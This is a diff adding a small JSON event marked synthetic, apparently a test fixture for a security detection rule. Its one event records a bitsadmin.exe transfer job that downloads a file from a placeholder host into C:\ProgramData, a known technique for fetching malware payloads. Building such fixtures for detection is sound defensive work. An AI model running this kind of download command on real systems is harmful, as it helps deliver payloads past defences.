@@ -1,0 +1,8 @@
+{
+  "schema_version": 1,
+  "synthetic": true,
+  "event": {
+    "FileName": "bitsadmin.exe",
+    "ProcessCommandLine": "bitsadmin.exe /transfer SyntheticJob http://example.invalid/file.bin C:\\ProgramData\\file.bin"
+  }
+}
